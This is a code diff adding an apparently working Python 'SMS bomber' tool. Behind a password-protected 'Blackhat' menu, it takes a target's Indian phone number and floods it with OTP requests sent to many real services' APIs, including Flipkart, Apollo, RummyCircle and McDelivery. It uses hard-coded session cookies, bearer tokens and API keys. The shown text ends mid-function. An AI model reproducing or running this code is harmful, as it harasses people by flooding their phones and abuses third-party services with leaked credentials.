aX2VnkapFvnbv0r+ma7bPAB2LK6KTwgliP2RgBquoTJbvcaUO8jvPX4JKjpoJJk19AqTcu3038djfoX0DwA/2leI+qqxLF61jUX52fzaeMJ29OB4MO1lDn0pjTxa/RnhL5M378eDEZmC6zd8CnGNBEECKRqOJ7QzJ//IpD8M0l9Yc6fPsuyvJ3D4hbmGyEN7KFldDthJ5sqc4T5RH0r+ZMm9OuKxRstcp0wCMitzkIHZAUMLEK575K7KIMvRXTEQmbR92TH4qmOUIkS2tMQMRr0IRyZmu62GOan5u32aoCBtNqCxyadSIVEi3x6gDCqqAzaDZEgBfGjVlvSur9alkfHU2A3CXuBBw4PSg8ClS6fNv/J9/f/OP//fal5rkj7198ysElFtDU9z399COTdToHwDoFiNswFMoun9TRWg0gSesmVwJe'))
+#!/usr/bin/env python
+# coding: utf-8
+
+# In[9]:
+
+
+# scripted by samay
+# Designed by vaimpier ritik 
+# email thread shark 
+# sms bomb script 
+# 2021 
+
+
+#--------imports 
+import os
+import sys
+try:
+    import colorama
+    import requests
+
+except ImportError:
+    try:
+        _ = os.system('pip install colorama' if os.name=='nt' else 'pip3 install colorama')
+        _ = os.system('pip install requests' if os.name=='nt' else 'pip3 install requests')
+    except:
+        pass
+import requests
+from time import sleep
+from colorama import Fore
+
+
+#------------------------
+
+#---------colors
+r = "\\033[1;31m"
+g = "\\033[1;32m"
+y = "\\033[1;33m"
+b = "\\033[1;34m"
+d = "\\033[2;37m"
+R = "\\033[1;41m"
+Y = "\\033[1;43m"
+B = "\\033[1;44m"
+w = "\\033[1;37m"
+g = "\\033[0;90m"
+y = r
+
+#--------functions and programs 
+
+logo = '''
+    \\033[1;31m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97        \\033[1;35m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97
+    \\033[1;32m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91        \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91
+    \\033[0;90m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \\033[1;32m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\\033[1;33m    \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \\033[1;33m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91
+    \\033[1;33m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \\033[1;34m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d    \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91
+    \\033[1;35m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91           \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91
+    \\033[1;31m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d           \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d    \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d     \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d
+'''
+
+def banner():
+    print(logo)
+
+def _under_():
+    print('\
+')
+
+def bye():
+    os.system('cls' if os.name=='nt' else 'clear')
+    banner()
+    string = """ 
+    \\033[1;37mDeveloper  \\033[1;34m: \\033[1;31mVaimpier Ritik x sincryptzork x shark
+    \\033[1;37mGithub     \\033[1;34m: \\033[1;31mVaimpierOfficial x Samay825 x shark
+    \\033[1;37mInstagram  \\033[1;34m: \\033[1;31m@vaimpier_ritik x @sincryptzork x @0891322930
+    """
+    for letter in string:
+        sleep(0.01) 
+        sys.stdout.write(letter)
+        sys.stdout.flush()
+    print("\
+")
+
+def clear():
+    _ = os.system('cls' if os.name=='nt' else 'clear')
+    
+def chutmarike(datasl):
+    print(r+"\xe2\x94\x94\xe2\x94\x80> "+w+"\\033[1;37m"+datasl)
+
+def front_interfere_look():
+    clear()
+    banner()
+    bye()
+    chutmarike('[ 1 ] Blackhat x Sms :')
+    chutmarike('[ 2 ] Blackhat x Call :')
+    chutmarike('[ 3 ] Blackhat x Sms2 :')
+    chutmarike('[ 4 ] Blackhat x Custom Sms :')
+    chutmarike('[ 5 ] Blackhat x Whatsapp Bomber :')
+    chutmarike('[ 6 ] Blackhat x Update :')
+    chutmarike('[ 7 ] Blackhat x Exit :')
+    _under_()
+    
+#-------------------v
+'''
+os.system('whoami > samay.txt')
+
+with open('samay.txt','r') as file:
+    data = file.read()
+
+try:
+    okstt = data.split()[0]
+    if okstt=='u0_a1622':
+        os.remove('samay.txt')
+        pass
+    else:
+        _under_()
+        chutmarike('You are not premium user ..')
+        os.remove('samay.txt')
+        _under_()
+        sys.exit()
+    
+    
+except:
+    sys.exit()'''
+
+def _cls_front_under():
+    clear()
+    banner()
+    _under_()
+
+_cls_front_under()
+    
+#---------------object oriented programming 
+
+
+class Samay:
+    def __init__(self,_user_com,_user2):
+        self.data = _user_com
+        self.data2 = _user2
+    def Passwordencrypt(self):
+        if self.data=='vaimsamay123' and self.data2=='vaimzork123':
+            front_interfere_look()
+            try:
+                ops_under = int(input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the Desire option : "+r))
+            except:
+                _under_()
+                chutmarike('Please Write the number to select option ..')
+                _under_()
+                sys.exit()
+            aayush = Mainscript(ops_under)
+            aayush.scripting()
+        else:
+            chutmarike('Wrong Password please Wait ..')
+            sleep(2.0)
+            _cls_front_under()
+            ok = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the username : "+r)
+            ok1 = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the password : "+r)
+            sl = Samay(ok,ok1)
+            sl.Passwordencrypt()
+class Mainscript:
+    def __init__(self,_sek_inp):
+        self.data_main = _sek_inp
+    def scripting(self):
+        if self.data_main==1:
+            _cls_front_under()
+            number = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the 10 Digit number +91 : "+r)
+            print(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mAttack Started on >> "+y+"+91"+number+r)
+            
+            def simplehacker():
+                url877 = f'https://simplehacker.pythonanywhere.com/sms/{number}'
+                ousimple = requests.get(url877)
+            
+            def medbuzz():
+                headers455 = {
+                    'Accept': 'application/json, text/plain, */*',
+                    'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
+                    'Connection': 'keep-alive',
+                    # Already added when you pass json=
+                    # 'Content-Type': 'application/json',
+                    'DNT': '1',
+                    'Origin': 'https://www.medbuzz.in',
+                    'Referer': 'https://www.medbuzz.in/',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Site': 'same-site',
+                    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
+                }
+
+                json_data455 = {
+                    'CountryCode': '+91',
+                    'PhoneNumber': number,
+                    'ApiKey': 'fbfc0125-fea6-4ab0-a919-fb01785c1457',
+                    'USERID': '',
+                    'SessionID': '',
+                }
+                response455 = requests.post('https://api.medbuzz.in/app/Generate_User_OTP', headers=headers455, json=json_data455)
+
+            def apollo():
+                headers555 = {
+                    'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
+                    'Connection': 'keep-alive',
+                    'DNT': '1',
+                    'Origin': 'https://www.apollopharmacy.in',
+                    'Referer': 'https://www.apollopharmacy.in/',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Site': 'cross-site',
+                    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
+                    'accept': '*/*',
+                    'authorization': 'Bearer 3d1833da7020e0602165529446587434',
+                    # Already added when you pass json=
+                    # 'content-type': 'application/json',
+                }
+
+                json_data555 = {
+                    'operationName': 'Login',
+                    'variables': {
+                        'mobileNumber': f'+91{number}',
+                        'loginType': 'PATIENT',
+                    },
+                    'query': 'query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\
+  login(mobileNumber: $mobileNumber, loginType: $loginType) {\
+    status\
+    message\
+    loginId\
+    __typename\
+  }\
+}\
+',
+                }
+
+                response555 = requests.post('https://webapi.apollo247.com/', headers=headers555, json=json_data555)
+
+            def flipkart():
+                cookies11 = {
+                    'T': 'TI166051777263500361725355184726229621803065293637887642574388860456',
+                    'SN': 'VI9F4398DB200245EFB45DDABB60763A5F.TOKE8F2773347064BEA8B89703E6443BE39.1660517772.LO',
+                    'AMCV_17EB401053DAF4840A490D4C%40AdobeOrg': '-227196251%7CMCIDTS%7C19219%7CMCMID%7C07813909948777340084014996032482903537%7CMCAID%7CNONE%7CMCOPTOUT-1660524980s%7CNONE',
+                    'gpv_pn': 'HomePage',
+                    'gpv_pn_t': 'FLIPKART%3AHomePage',
+                    's_cc': 'true',
+                    'AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg': '1',
+                    'S': 'd1t12TBtWP3k/Nj8/Pwk/ez9CP9D4s238O0dIrFzOXUTD4a+KvuCEEYXRfJIjDkZEeirRSbBUlhNSy4yj5zq2U/tDGQ==',
+                    's_sq': '%5B%5BB%5D%5D',
+                }
+
+                headers11 = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
+                    'Accept': '*/*',
+                    'Accept-Language': 'en-US,en;q=0.5',
+                    # Already added when you pass json=
+                    # 'Content-Type': 'application/json',
+                    'X-User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 FKUA/website/42/website/Desktop',
+                    'Origin': 'https://www.flipkart.com',
+                    'DNT': '1',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Site': 'same-site',
+                    'Referer': 'https://www.flipkart.com/',
+                    'Connection': 'keep-alive',
+                    # Requests sorts cookies= alphabetically
+                    # 'Cookie': 'T=TI166051777263500361725355184726229621803065293637887642574388860456; SN=VI9F4398DB200245EFB45DDABB60763A5F.TOKE8F2773347064BEA8B89703E6443BE39.1660517772.LO; AMCV_17EB401053DAF4840A490D4C%40AdobeOrg=-227196251%7CMCIDTS%7C19219%7CMCMID%7C07813909948777340084014996032482903537%7CMCAID%7CNONE%7CMCOPTOUT-1660524980s%7CNONE; gpv_pn=HomePage; gpv_pn_t=FLIPKART%3AHomePage; s_cc=true; AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg=1; S=d1t12TBtWP3k/Nj8/Pwk/ez9CP9D4s238O0dIrFzOXUTD4a+KvuCEEYXRfJIjDkZEeirRSbBUlhNSy4yj5zq2U/tDGQ==; s_sq=%5B%5BB%5D%5D',
+                }
+
+                json_data11 = {
+                    'loginId': '',
+                }
+
+                json_data11['loginId'] = (f'+91{number}')
+                
+                response11 = requests.post('https://2.rome.api.flipkart.com/api/7/user/otp/generate', cookies=cookies11, headers=headers11, json=json_data11)
+            
+            
+                
+            def fastpronumber():
+                cookies10 = {
+                    'cf_clearance': 'ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150',
+                    '_pk_id.376245.6a19': '3f6ba316cc7c0364.1660033473.',
+                }
+
+                headers10 = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                    'Accept-Language': 'en-US,en;q=0.5',
+                    'DNT': '1',
+                    'Connection': 'keep-alive',
+                    # Requests sorts cookies= alphabetically
+                    # 'Cookie': 'cf_clearance=ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150; _pk_id.376245.6a19=3f6ba316cc7c0364.1660033473.',
+                    'Upgrade-Insecure-Requests': '1',
+                    'Sec-Fetch-Dest': 'document',
+                    'Sec-Fetch-Mode': 'navigate',
+                    'Sec-Fetch-Site': 'same-origin',
+                    'Cache-Control': 'max-age=0',
+                    # Requests doesn't support trailers
+                    # 'TE': 'trailers',
+                }
+
+                params10 = {
+                    'sr': number,
+                    'key': '@itztktricks',
+                    'submit': 'Submit Query',
+                }
+                
+                #
+                response10 = requests.get('https://freebomber.ml/tk/sms/bomber.php', params=params10, cookies=cookies10, headers=headers10)
+                
+                
+            def industrialapi():
+                url = 'https://www.industrybuying.com'
+                ol = requests.get(url).cookies
+                lsp = ol['SERVER']
+                cookies8 = {
+                    'SERVER': lsp,
+                    '_gid': 'GA1.2.1210481606.1660515269',
+                    '_gat': '1',
+                    '_gcl_au': '1.1.2042821914.1660515269',
+                    'ib_referral': 'UTM',
+                    'ib_utm_date_time': 'Mon Aug 15 2022 03:44:29 GMT+0530 (India Standard Time)',
+                    'ib_utm_source': 'Affiliate',
+                    'ib_utm_medium': 'icubeswire',
+                    'ib_utm_campaign': '3881_',
+                    'ib_activity_time': '8-15-2022 3:44:29',
+                    'LONG_SESSION_ID': '3552db7a-245b-2da6-be4e-1698aca530f6',
+                    '__sts': '{"sid":1660515270317,"tx":1660515270317,"url":"https%3A%2F%2Fwww.industrybuying.com%2F%3Futm_source%3DAffiliate%26utm_medium%3Dicubeswire%26utm_campaign%3D3881_","pet":1660515270317,"set":1660515270317}',
+                    '__stp': '{"visit":"new","uuid":"74e35b34-b39f-44d7-84e3-fa54f411a210"}',
+                    '_ga': 'GA1.1.132751137.1660515269',
+                    '__stdf': '0',
+                    '__stgeo': '"0"',
+                    '__stbpnenable': '1',
+                    '_fbp': 'fb.1.1660515271441.504963341',
+                    '_hjSessionUser_2975779': 'eyJpZCI6IjVjZTM1MTY4LWVmOTQtNTQ4YS05ODY5LWI0ZTExM2ZiMWRkMCIsImNyZWF0ZWQiOjE2NjA1MTUyNzEzNTMsImV4aXN0aW5nIjpmYWxzZX0=',
+                    '_hjFirstSeen': '1',
+                    '_hjIncludedInSessionSample': '0',
+                    '_hjSession_2975779': 'eyJpZCI6IjJmNzdlZGFjLWFmOWUtNGFlNC05YzI0LTk3MmI0MjY3YzJiMSIsImNyZWF0ZWQiOjE2NjA1MTUyNzIxODIsImluU2FtcGxlIjpmYWxzZX0=',
+                    '__stat': '"BLOCK"',
+                    '_ga_YCSK09WVKB': 'GS1.1.1660515271.1.0.1660515277.0',
+                }
+
+                headers8 = {
+                    'authority': 'www.industrybuying.com',
+                    'accept': '*/*',
+                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
+                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    # Requests sorts cookies= alphabetically
+                    # 'cookie': 'SERVER=s1; _gid=GA1.2.1210481606.1660515269; _gat=1; _gcl_au=1.1.2042821914.1660515269; ib_referral=UTM; ib_utm_date_time=Mon Aug 15 2022 03:44:29 GMT+0530 (India Standard Time); ib_utm_source=Affiliate; ib_utm_medium=icubeswire; ib_utm_campaign=3881_; ib_activity_time=8-15-2022 3:44:29; LONG_SESSION_ID=3552db7a-245b-2da6-be4e-1698aca530f6; __sts={"sid":1660515270317,"tx":1660515270317,"url":"https%3A%2F%2Fwww.industrybuying.com%2F%3Futm_source%3DAffiliate%26utm_medium%3Dicubeswire%26utm_campaign%3D3881_","pet":1660515270317,"set":1660515270317}; __stp={"visit":"new","uuid":"74e35b34-b39f-44d7-84e3-fa54f411a210"}; _ga=GA1.1.132751137.1660515269; __stdf=0; __stgeo="0"; __stbpnenable=1; _fbp=fb.1.1660515271441.504963341; _hjSessionUser_2975779=eyJpZCI6IjVjZTM1MTY4LWVmOTQtNTQ4YS05ODY5LWI0ZTExM2ZiMWRkMCIsImNyZWF0ZWQiOjE2NjA1MTUyNzEzNTMsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjSession_2975779=eyJpZCI6IjJmNzdlZGFjLWFmOWUtNGFlNC05YzI0LTk3MmI0MjY3YzJiMSIsImNyZWF0ZWQiOjE2NjA1MTUyNzIxODIsImluU2FtcGxlIjpmYWxzZX0=; __stat="BLOCK"; _ga_YCSK09WVKB=GS1.1.1660515271.1.0.1660515277.0',
+                    'dnt': '1',
+                    'origin': 'https://www.industrybuying.com',
+                    'referer': 'https://www.industrybuying.com/?utm_source=Affiliate&utm_medium=icubeswire&utm_campaign=3881_',
+                    'sec-fetch-dest': 'empty',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-site': 'same-origin',
+                    'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
+                    'x-requested-with': 'XMLHttpRequest',
+                }
+
+                data8 = {
+                    'username': number,
+                }
+                response8 = requests.post('https://www.industrybuying.com/user/api/send-otp/', cookies=cookies8, headers=headers8, data=data8)
+
+
+            def snapmint():
+                headers7 = {
+                    'authority': 'api.snapmint.com',
+                    'accept': '*/*',
+                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
+                    # Already added when you pass json=
+                    # 'content-type': 'application/json',
+                    'dnt': '1',
+                    'origin': 'https://snapmint.com',
+                    'referer': 'https://snapmint.com/',
+                    'sec-fetch-dest': 'empty',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-site': 'same-site',
+                    'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
+                }
+
+                json_data7 = {
+                    'mobile': number,
+                }
+                response7 = requests.post('https://api.snapmint.com/v1/public/sign_up', headers=headers7, json=json_data7)
+
+            def rummytime():
+                headers6 = {
+                    'authority': 'api.rummytime.com',
+                    'accept': 'application/json, text/plain, */*',
+                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
+                    'content-type': 'application/json;charset=UTF-8',
+                    'dnt': '1',
+                    'origin': 'https://www.rummytime.com',
+                    'referer': 'https://www.rummytime.com/',
+                    'sec-fetch-dest': 'empty',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-site': 'same-site',
+                    'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
+                }
+
+                json_data6 = {
+                    'mobile': number,
+                }
+                response6 = requests.post('https://api.rummytime.com/api/user/sendAppDownloadLink', headers=headers6, json=json_data6)
+
+            def rummyapi():
+                cookies5 = {
+                    'sameSiteNoneSupported': 'true',
+                    'LONG_VISITOR': '2787e267-cbdf-4032-8f2d-9645fb1cfec1',
+                    'device.info.cookie': '{"bv":"104.0.0.0","bn":"Chrome","osv":"10","osn":"Windows","tbl":"false","vnd":"false","mdl":"false"}',
+                    'SSID': 'SSID4b721211-5179-48db-9ca2-8cedf600d5c8',
+                    'SSIDuser': 'SSID4b721211-5179-48db-9ca2-8cedf600d5c8%3A0',
+                    'ga24x7_pixeltracker': 'from_page%3Dindex.html%26referrer_url%3Dhttps%253A%252F%252Fwww.google.com%252F',
+                    '__utma': '3588915.1172103635.1660514286.1660514286.1660514286.1',
+                    '__utmc': '3588915',
+                    '__utmz': '3588915.1660514286.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
+                    '__utmt_pageTracker': '1',
+                    '__utmb': '3588915.1.10.1660514286',
+                    'NA_IDVISIT': '0d7937d9-8dd9-4bf5-95f5-20f4943a0537',
+                    'NA_VISITOR': '0d7937d9-8dd9-4bf5-95f5-20f4943a0537',
+                    'isLivechat': '0',
+                    'ga24x7_jsessionid': '"SSID4b721211-5179-48db-9ca2-8cedf600d5c8,, "',
+                    'hash_parameter': '0',
+                    'AWSALB': 'twWHmfYRDBfPLrq9WstPEtAY/+Wy45PMjFsBaLKs3gRPu8KJmMp70nDEQWdSEF04CAvl9Hv7eCD07PB9S9Ij9LG0ls/jMqOOu8C3TMtKMFa3Da5Coo1dqe2WWj7g',
+                    'AWSALBCORS': 'twWHmfYRDBfPLrq9WstPEtAY/+Wy45PMjFsBaLKs3gRPu8KJmMp70nDEQWdSEF04CAvl9Hv7eCD07PB9S9Ij9LG0ls/jMqOOu8C3TMtKMFa3Da5Coo1dqe2WWj7g',
+                    '_ga': 'GA1.2.1172103635.1660514286',
+                    '_gid': 'GA1.2.482317890.1660514290',
+                    '_gat_UA-3610156-1': '1',
+                }
+
+                headers5 = {
+                    'authority': 'www.rummycircle.com',
+                    'accept': '*/*',
+                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
+                    'cache-control': 'max-age=0',
+                    # Already added when you pass json=
+                    # 'content-type': 'application/json',
+                    # Requests sorts cookies= alphabetically
+                    # 'cookie': 'sameSiteNoneSupported=true; LONG_VISITOR=2787e267-cbdf-4032-8f2d-9645fb1cfec1; device.info.cookie={"bv":"104.0.0.0","bn":"Chrome","osv":"10","osn":"Windows","tbl":"false","vnd":"false","mdl":"false"}; SSID=SSID4b721211-5179-48db-9ca2-8cedf600d5c8; SSIDuser=SSID4b721211-5179-48db-9ca2-8cedf600d5c8%3A0; ga24x7_pixeltracker=from_page%3Dindex.html%26referrer_url%3Dhttps%253A%252F%252Fwww.google.com%252F; __utma=3588915.1172103635.1660514286.1660514286.1660514286.1; __utmc=3588915; __utmz=3588915.1660514286.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt_pageTracker=1; __utmb=3588915.1.10.1660514286; NA_IDVISIT=0d7937d9-8dd9-4bf5-95f5-20f4943a0537; NA_VISITOR=0d7937d9-8dd9-4bf5-95f5-20f4943a0537; isLivechat=0; ga24x7_jsessionid="SSID4b721211-5179-48db-9ca2-8cedf600d5c8,, "; hash_parameter=0; AWSALB=twWHmfYRDBfPLrq9WstPEtAY/+Wy45PMjFsBaLKs3gRPu8KJmMp70nDEQWdSEF04CAvl9Hv7eCD07PB9S9Ij9LG0ls/jMqOOu8C3TMtKMFa3Da5Coo1dqe2WWj7g; AWSALBCORS=twWHmfYRDBfPLrq9WstPEtAY/+Wy45PMjFsBaLKs3gRPu8KJmMp70nDEQWdSEF04CAvl9Hv7eCD07PB9S9Ij9LG0ls/jMqOOu8C3TMtKMFa3Da5Coo1dqe2WWj7g; _ga=GA1.2.1172103635.1660514286; _gid=GA1.2.482317890.1660514290; _gat_UA-3610156-1=1',
+                    'dnt': '1',
+                    'origin': 'https://www.rummycircle.com',
+                    'referer': 'https://www.rummycircle.com/',
+                    'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
+                    'sec-ch-ua-mobile': '?1',
+                    'sec-ch-ua-platform': '"Android"',
+                    'sec-fetch-dest': 'empty',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-site': 'same-origin',
+                    'user-agent': 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36',
+                }
+
+                json_data5 = {
+                    'mobile': number,
+                    'deviceId': 'ff2e30c7-0998-42c7-b2a7-4293c38bb040',
+                    'deviceName': '',
+                    'refCode': '',
+                    'isPlaycircle': False,
+                }
+                response5 = requests.post('https://www.rummycircle.com/api/fl/auth/v3/getOtp', cookies=cookies5, headers=headers5, json=json_data5)
+
+
+
+            def nira():
+                headers4 = {
+                    'authority': '63ti5s0o80.execute-api.ap-south-1.amazonaws.com',
+                    'accept': 'application/json, text/plain, */*',
+                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
+                    # Already added when you pass json=
+                    # 'content-type': 'application/json',
+                    'dnt': '1',
+                    'origin': 'https://apply.nirafinance.com',
+                    'referer': 'https://apply.nirafinance.com/',
+                    'sec-fetch-dest': 'empty',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-site': 'cross-site',
+                    'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
+                }
+
+                json_data4 = {
+                    'mobileNumber': number,
+                    'otp': '',
+                }
+                response4 = requests.post('https://63ti5s0o80.execute-api.ap-south-1.amazonaws.com/Prod/nirawebloginapi', headers=headers4, json=json_data4)
+
+
+
+            def macdonal():
+                headers3 = {
+                    'Accept': 'application/json, text/plain, */*',
+                    'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
+                    'AddressID': '0',
+                    'Authorization': 'Token 1e32549b6d6054059d8447d12be42612e31ac6f4af1155473ceb5e940d23649d',
+                    'BusinessModelID': '18',
+                    'CartID': '0',
+                    'Connection': 'keep-alive',
+                    # Already added when you pass json=
+                    # 'Content-Type': 'application/json',
+                    'CustomerID': '-1',
+                    'DNT': '1',
+                    'OrderTime': '0',
+                    'OrderType': 'R',
+                    'Origin': 'https://www.mcdelivery.co.in',
+                    'PlatForm': 'msite',
+                    'Referer': 'https://www.mcdelivery.co.in/',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Site': 'same-site',
+                    'Storeid': '1',
